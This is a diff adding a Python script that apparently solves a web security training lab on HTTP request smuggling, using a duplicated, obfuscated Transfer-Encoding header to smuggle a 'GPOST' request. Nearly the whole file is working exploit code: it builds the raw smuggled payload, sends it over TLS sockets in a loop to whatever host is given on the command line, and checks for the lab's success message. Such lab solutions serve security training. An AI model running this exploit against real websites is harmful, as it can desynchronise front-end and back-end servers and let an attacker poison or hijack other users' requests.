@@ -1,0 +1,93 @@
+import requests
+import sys
+import urllib3
+import socket, ssl
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore
+
+# Burp Suite proxy
+proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080',  
+}
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
+}
+
+
+def raw_http(host, port, payload, tls=True, timeout=10):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    if tls:
+        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=host)
+    sock.connect((host, port))
+    sock.sendall(payload.encode("latin-1"))
+    data = b""
+    try:
+        while chunk := sock.recv(4096):
+            data += chunk
+    except (socket.timeout, ConnectionResetError):
+        pass
+    finally:
+        sock.close()
+    return data
+
+def check_solved_lab(s, url):
+    r = s.get(url)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("[+] Successful solved lab")
+        sys.exit(0)
+
+def payload_duplicate_TE_header(host):
+    smuggled = (
+        "GPOST / HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        "Content-Length: 10\r\n"
+        "\r\n"
+        "x="
+    )
+    body = (
+        f"{hex(len(smuggled))[2:]}\r\n"
+        + smuggled + "\r\n"
+        "0\r\n"
+        "\r\n"
+    )
+    payload = (
+        "POST / HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Content-Length: {len(body.split('\r\n')[0]) + 2}\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Transfer-Encoding: x\r\n"
+        "\r\n"
+        + body
+    )
+    return payload
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+
+    s = requests.Session()
+    url = sys.argv[1].rstrip('/')
+
+    host = url.split('//')[1]
+    payload = payload_duplicate_TE_header(host)
+    print('[*] Payload:')
+    print(payload)
+
+    print('[*] Try smuggle request:')
+    for _ in range(10):
+        r = raw_http(host, 443, payload)
+        if b'Unrecognized method GPOST' in r:
+            print(r.decode())
+            break
+
+    check_solved_lab(s, url)
+    check_solved_lab(s, url)
+
+if __name__ == '__main__':
+    main()
